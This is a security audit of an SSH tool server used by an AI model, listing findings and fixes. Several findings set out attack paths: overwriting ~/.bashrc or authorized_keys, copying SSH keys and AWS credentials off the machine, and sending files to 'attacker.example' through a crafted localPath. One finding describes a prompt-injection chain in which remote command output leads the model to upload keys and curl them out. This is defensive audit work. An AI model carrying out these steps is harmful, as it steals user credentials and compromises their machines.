title: downloadFile writes to any local path (arbitrary local file overwrite)
reason: localPath is used as the scp destination with no directory restriction, so an injected call can first write a payload on a known host with runRemoteCommand and then downloadFile it over ~/.bashrc, ~/.ssh/authorized_keys or ~/.ssh/config (e.g. adding a ProxyCommand), giving code execution on the user's own machine.
fix: Restrict localPath to a configured download directory: path.resolve + fs.realpath of the parent, require path.relative(root, target) not to start with '..', refuse existing files unless overwrite is explicitly confirmed, and reject paths containing ':' before the first '/'.

title: uploadFile reads any local file (SSH keys, cloud credentials) and copies it off the machine
reason: localPath has no allowlist, so localPath=~/.ssh/id_ed25519 or ~/.aws/credentials is copied to a remote host where runRemoteCommand can read it back or send it anywhere.
fix: Limit uploads to a configured directory (realpath + containment check) and block ~/.ssh, ~/.aws, ~/.config and similar secret locations.

title: scp treats localPath containing 'host:' as a remote spec, bypassing the known-host allowlist
reason: Only hostAlias is checked against ~/.ssh/config/known_hosts; scp parses any operand with a ':' before the first '/' as a remote host, and '--' does not change that. downloadFile with localPath='attacker.example:loot' copies a file from the user's server straight to an attacker host (accepted via StrictHostKeyChecking=accept-new); uploadFile with localPath='attacker.example:x' pulls attacker content onto the server.
fix: Reject localPath values that contain ':' before the first '/' (or prefix relative paths with './' and resolve to an absolute path), after the containment check from M001/M002.

title: runRemoteCommand / runCommandBatch run arbitrary shell commands on every configured and known host with no approval

evidence.quote: const child = this._spawn(SSH_BIN, ['-o', 'StrictHostKeyChecking=accept-new', '--', hostAlias, command], spawnOptions);

reason: By design any tool call executes any command on any host in ~/.ssh/config or ~/.ssh/known_hosts (so every host the user ever connected to), with stored @password credentials applied automatically; a prompt injection can therefore run destructive or exfiltrating commands on production servers. Local option/shell injection is properly blocked (hostAlias whitelist, '--', shell:false).
fix: Require human approval in the client for these tools, add an opt-in allowlist of hosts (not all of known_hosts) and optionally a command allowlist / read-only mode.

title: Untrusted remote output + local secrets + outbound copy in one server
reason: Command output from remote hosts (logs, files, web content) goes straight into the model; injected text there can make the model uploadFile ~/.ssh keys and then curl them out with runRemoteCommand, with no approval step.
fix: Fix M001-M003, mark remote output as untrusted data, and require approval for file transfers and commands.

title: Remote command output returned unmarked
reason: stdout/stderr of remote commands (which can contain attacker-written text such as log lines) enters the model context as-is.

title: Host keys of new hosts accepted automatically
reason: First connections to config hosts (and attacker-chosen hosts via M003) accept any host key, so a network attacker on first use can impersonate the server and capture @password credentials.
fix: Drop the override and rely on the user's ssh config, or make accept-new opt-in.

title: Askpass helper written to a predictable path in the shared temp directory
reason: On multi-user Linux hosts with a shared /tmp, another local user can pre-create or race this predictable path; the script is executed by ssh as the current user with the password in its environment. Not a risk on single-user machines or per-user TMPDIR (macOS).
fix: Create the script inside fs.mkdtemp() with mode 0700 and open it with the 'wx' flag.
